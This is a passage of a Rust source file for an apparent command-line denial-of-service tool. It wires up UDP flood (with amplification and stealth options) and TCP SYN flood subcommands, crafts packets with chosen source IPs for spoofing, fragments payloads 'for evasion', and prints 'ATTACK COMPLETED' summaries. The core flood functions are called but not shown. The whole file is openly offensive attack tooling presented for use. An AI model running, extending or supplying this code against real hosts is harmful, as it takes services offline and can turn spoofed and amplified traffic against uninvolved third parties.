        target: String,
        
        #[arg(short, long, help = "Target port")]
        port: u16,
        
        #[arg(short = 'T', long, default_value = "4", help = "Number of threads")]
        threads: usize,
        
        #[arg(short, long, default_value = "10", help = "Duration in seconds")]
        duration: u64,
        
        #[arg(short = 'r', long, default_value = "1000", help = "Packets per second")]
        pps: u64,
        
        #[arg(short, long, default_value = "512", help = "Packet size in bytes")]
        size: usize,
        
        #[arg(long, help = "Enable amplification mode")]
        amplification: bool,
        
        #[arg(long, help = "Enable stealth mode")]
        stealth: bool,
    },
    
    /// TCP SYN flood attack
    SynFlood {
        #[arg(short, long, help = "Target IP address")]
        target: String,
        
        #[arg(short, long, help = "Target port")]
        port: u16,
        
        #[arg(short = 'T', long, default_value = "4", help = "Number of threads")]
        threads: usize,
        
        #[arg(short, long, default_value = "10", help = "Duration in seconds")]
        duration: u64,
        
        #[arg(short = 'r', long, default_value = "1000", help = "Packets per second")]
        pps: u64,
        
        #[arg(long, help = "Enable stealth mode")]
        stealth: bool,
    },
    
    /// Craft custom TCP SYN packet
    CraftSyn {
        #[arg(long, help = "Source IP address")]
        source_ip: String,
        
        #[arg(long, help = "Source port")]
        source_port: u16,
        
        #[arg(long, help = "Destination IP address")]
        dest_ip: String,
        
        #[arg(long, help = "Destination port")]
        dest_port: u16,
        
        #[arg(short, long, help = "Output file for packet")]
        output: String,
    },
    
    /// Craft custom UDP packet
    CraftUdp {
        #[arg(long, help = "Source IP address")]
        source_ip: String,
        
        #[arg(long, help = "Source port")]
        source_port: u16,
        
        #[arg(long, help = "Destination IP address")]
        dest_ip: String,
        
        #[arg(long, help = "Destination port")]
        dest_port: u16,
        
        #[arg(short = 'P', long, help = "Payload data")]
        payload: String,
        
        #[arg(short, long, help = "Output file for packet")]
        output: String,
    },
    
    /// Fragment payload for evasion
    Fragment {
        #[arg(short, long, help = "Input payload file")]
        input: String,
        
        #[arg(short, long, help = "Output directory for fragments")]
        output: String,
        
        #[arg(short, long, default_value = "512", help = "Fragment size in bytes")]
        size: usize,
    },
    
    /// Validate configuration
    Validate {
        #[arg(short = 'T', long, help = "Threads")]
        threads: usize,
        
        #[arg(short = 'r', long, help = "Packets per second")]
        pps: u64,
        
        #[arg(short, long, help = "Packet size")]
        size: usize,
        
        #[arg(short, long, help = "Duration in seconds")]
        duration: u64,
    },
}


#[tokio::main]
async fn main() -> Result<()> {
    // Display banner
    display_banner().await;
    
    // Initialize logging
    tracing_subscriber::fmt::init();
    
    // Parse CLI arguments
    let cli = Cli::parse();
    
    match cli.command {
        Commands::UdpFlood { target, port, threads, duration, pps, size, amplification, stealth } => {
            info!("Starting UDP flood attack");
            
            let result = run_stress_test(
                target,
                port,
                threads,
                duration,
                pps,
                size,
                amplification,
                stealth,
            ).await?;
            
            println!();
            println!("{}", "═══════════════════════════════════════════════════════".bright_cyan());
            println!("{}", "                    ATTACK COMPLETED                    ".bright_green().bold());
            println!("{}", "═══════════════════════════════════════════════════════".bright_cyan());
            println!("{}", format!("  Packets sent: {}", result.packets_sent).bright_white());
            println!("{}", format!("  Bytes sent: {} MB", result.bytes_sent / 1_000_000).bright_white());
            println!("{}", format!("  Duration: {:.2}s", result.attack_duration.as_secs_f64()).bright_white());
            println!("{}", format!("  Average PPS: {:.2}", result.average_pps).bright_white());
            println!("{}", format!("  Peak PPS: {:.2}", result.peak_pps).bright_white());
            println!("{}", "═══════════════════════════════════════════════════════".bright_cyan());
        }
        
        Commands::SynFlood { target, port, threads, duration, pps, stealth } => {
            info!("Starting TCP SYN flood attack");
            
            let target_ip: Ipv4Addr = target.parse()?;
            let packets_sent = tcp_syn_flood(target_ip, port, duration, pps).await?;
            
            println!();
            println!("{}", "═══════════════════════════════════════════════════════".bright_cyan());
            println!("{}", "                 SYN FLOOD COMPLETED                    ".bright_green().bold());
            println!("{}", "═══════════════════════════════════════════════════════".bright_cyan());
            println!("{}", format!("  Packets crafted: {}", packets_sent).bright_white());
            println!("{}", format!("  Target: {}:{}", target, port).bright_white());
            println!("{}", format!("  Threads: {}", threads).bright_white());
            println!("{}", format!("  Duration: {}s", duration).bright_white());
            println!("{}", format!("  Stealth mode: {}", if stealth { "enabled" } else { "disabled" }).bright_white());
            println!("{}", "═══════════════════════════════════════════════════════".bright_cyan());
        }
        
        Commands::CraftSyn { source_ip, source_port, dest_ip, dest_port, output } => {
            info!("Crafting TCP SYN packet");
            
            let src_ip: Ipv4Addr = source_ip.parse()?;
            let dst_ip: Ipv4Addr = dest_ip.parse()?;
            
            let packet = craft_tcp_syn_packet(src_ip, source_port, dst_ip, dest_port);
            
            std::fs::write(&output, &packet)?;
            
            println!("{}", format!("  TCP SYN packet crafted and saved to: {}", output).bright_green());
            println!("{}", format!("  Source: {}:{}", source_ip, source_port).bright_white());
            println!("{}", format!("  Destination: {}:{}", dest_ip, dest_port).bright_white());
            println!("{}", format!("  Packet size: {} bytes", packet.len()).bright_white());
        }
        
        Commands::CraftUdp { source_ip, source_port, dest_ip, dest_port, payload, output } => {
            info!("Crafting UDP packet");
            
            let src_ip: Ipv4Addr = source_ip.parse()?;
            let dst_ip: Ipv4Addr = dest_ip.parse()?;
            
            let packet = craft_udp_packet(src_ip, source_port, dst_ip, dest_port, payload.as_bytes());
            
            std::fs::write(&output, &packet)?;
            
            println!("{}", format!("  UDP packet crafted and saved to: {}", output).bright_green());
            println!("{}", format!("  Source: {}:{}", source_ip, source_port).bright_white());
            println!("{}", format!("  Destination: {}:{}", dest_ip, dest_port).bright_white());
            println!("{}", format!("  Packet size: {} bytes", packet.len()).bright_white());
        }
        
        Commands::Fragment { input, output, size } => {
            info!("Fragmenting payload");
            
            let payload = std::fs::read(&input)?;
            let fragments = fragment_payload(&payload, size);
            
            std::fs::create_dir_all(&output)?;
            
            for (i, fragment) in fragments.iter().enumerate() {
                let fragment_path = format!("{}/fragment_{:04}.bin", output, i);
                std::fs::write(&fragment_path, fragment)?;
            }
            
            println!("{}", format!("  Payload fragmented into {} pieces", fragments.len()).bright_green());
            println!("{}", format!("  Original size: {} bytes", payload.len()).bright_white());
            println!("{}", format!("  Fragment size: {} bytes", size).bright_white());
            println!("{}", format!("  Output directory: {}", output).bright_white());
        }
        
        Commands::Validate { threads, pps, size, duration } => {
            info!("Validating configuration");
            
            let config = UdpStressConfig {
                target_ip: Ipv4Addr::new(127, 0, 0, 1),
                target_port: 8080,
                source_ips: Vec::new(),
                threads,
                duration,
                packets_per_second: pps,
                packet_size: size,
                randomize_source_ports: true,
                randomize_packet_size: false,
                use_amplification: false,
                amplification_targets: Vec::new(),
                randomize_payload: true,
                stealth_mode: false,
                raw_sockets: false,
                high_bandwidth: false,
            };
            
            match validate_config(&config) {
                Ok(_) => {
                    println!("{}", "  Configuration is VALID".bright_green().bold());
                    println!("{}", format!("  Threads: {}", threads).bright_white());
                    println!("{}", format!("  PPS: {}", pps).bright_white());
                    println!("{}", format!("  Packet size: {} bytes", size).bright_white());
                    println!("{}", format!("  Duration: {}s", duration).bright_white());
                }
                Err(e) => {
                    println!("{}", format!("  Configuration is INVALID: {}", e).bright_red().bold());
                }
            }
        }
    }
    
    Ok(())
}
